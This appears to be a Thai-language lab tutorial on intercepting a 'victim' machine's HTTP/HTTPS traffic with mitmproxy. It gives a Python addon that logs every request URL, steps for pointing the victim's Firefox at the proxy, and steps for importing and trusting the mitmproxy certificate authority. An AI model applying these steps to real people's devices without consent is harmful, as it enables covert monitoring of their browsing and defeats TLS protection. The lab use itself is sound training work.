# PROXY
# MITM Proxy URL Capture (mitmproxy) - คู่มือฉบับละเอียด

## 1. ข้อมูลทั่วไป
โปรเจกต์นี้ใช้ **mitmproxy** เพื่อดักจับ HTTP/HTTPS traffic ของเหยื่อ (ejb) ผ่าน proxy ของเครื่องโจมตี (MAX) และบันทึก **URL ของทุก request** ลงไฟล์ `captured_urls.txt`  

---

## 2. ติดตั้ง mitmproxy

บนเครื่องโจมตี (MAX) ใช้คำสั่ง:
```bash
sudo apt update
sudo apt install mitmproxy -y
ตรวจสอบเวอร์ชัน:
mitmproxy --version
3. สร้าง Python Script สำหรับดัก URL
สร้างไฟล์ capture.py ใน home directory:
nano ~/capture.py
ใส่โค้ดดังนี้:
from mitmproxy import http
import os
from datetime import datetime

# กำหนด path ไฟล์บันทึก URL
output_file = os.path.expanduser("~/captured_urls.txt")

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    method = flow.request.method
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # สร้างบรรทัดสำหรับบันทึก
    line = f"[{ts}] {method} {url}\n"

    # แสดง URL บน terminal
    print(line, end="")

    # append ลงไฟล์
    with open(output_file, "a") as f:
        f.write(line)
บันทึกด้วย Ctrl+O → Enter → Ctrl+X
4. รัน mitmproxy พร้อม script
บน MAX:
mitmdump -p 8080 -s ~/capture.py
-p 8080 → ระบุ port proxy
-s ~/capture.py → โหลด script ดัก URL
ถ้าต้องการหยุด mitmdump ให้กด Ctrl+C
5. ตั้งค่า Proxy บนเหยื่อ (ejb)
เปิด Firefox บนเครื่องเหยื่อ
ไปที่ Preferences/Settings → Network Settings → Manual proxy configuration
ตั้งค่า:
HTTP Proxy: <IP ของ MAX> Port: 8080
HTTPS Proxy: <IP ของ MAX> Port: 8080
ติ๊กเลือก Use this proxy for all protocols
6. ติดตั้ง Certificate ของ mitmproxy บน Firefox
ดาวน์โหลด cert จาก MAX:
mitmproxy --export-cert ~/mitmproxy-ca-cert.pem
บน Firefox ของเหยื่อ:
Preferences → Privacy & Security → View Certificates → Import
เลือกไฟล์ mitmproxy-ca-cert.pem
ติ๊ก Trust this CA to identify websites → OK
7. ตรวจสอบการทำงาน
เปิดเว็บใด ๆ บนเหยื่อ → request จะผ่าน mitmproxy
บน MAX terminal จะเห็น URL print ออกมาแบบ real-time
ตรวจสอบไฟล์ URL:
ls -l ~/captured_urls.txt
tail -f ~/captured_urls.txt
URL ใหม่จะ append ลงไฟล์ทันที
8. Tips
ถ้า traffic เยอะ → filter เฉพาะ domain:
if "hackthebox.com" in url:
    with open(output_file, "a") as f:
        f.write(line)
ถ้าต้องการเก็บ headers หรือ method → เพิ่มใน line
สามารถใช้ tail -f ~/captured_urls.txt | grep hackthebox → ดูเฉพาะ URL ของ HackTheBox
9. สรุป
ตอนนี้คุณสามารถ:
รัน mitmproxy ดักจับ traffic ของเหยื่อ
แสดง URL แบบ real-time บน terminal
บันทึก URL ลงไฟล์ captured_urls.txt พร้อม timestamp และ HTTP method
ระบบพร้อมใช้งานเต็มที่สำหรับ การวิเคราะห์ traffic ของเหยื่อ ✅
